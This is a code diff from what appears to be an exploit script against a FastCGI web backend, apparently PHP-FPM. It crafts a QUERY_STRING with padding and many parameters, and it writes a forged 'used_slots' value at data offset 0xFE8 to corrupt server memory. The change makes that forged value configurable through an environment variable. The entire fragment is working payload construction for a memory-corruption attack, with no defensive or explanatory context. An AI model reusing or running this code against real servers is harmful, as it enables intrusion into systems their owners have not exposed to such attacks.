@@ -89,11 +89,12 @@ if qpad or nvars or n2p:
         qs = b"q=" + enc + b"A" * max(0, qpad - len(mark))
     for i in range(nvars):
         qs += b"&a%d=v" % i
+    used_slots = int(os.environ.get("USED_SLOTS", "-256"))
     for i in range(n2p):
         val = bytearray(b"Q" * vlen)
         if vlen > 0xFE8 + 8:
-            # used_slots = -256 at the query string's data offset 0xFE8
-            val[0xFE8:0xFE8+8] = b"\x00\xff\xff\xff\xff\xff\xff\xff"
+            # used_slots at the query string's data offset 0xFE8
+            val[0xFE8:0xFE8+8] = struct.pack("<q", used_slots)
         enc = b"".join((bytes([c]) if (0x20 <= c < 0x7f and c not in b"&=%+;#") else b"%%%02X" % c) for c in val)
         qs += b"&v%d=" % i + enc
     params[b"QUERY_STRING"] = qs[1:] if qs.startswith(b"&") else qs
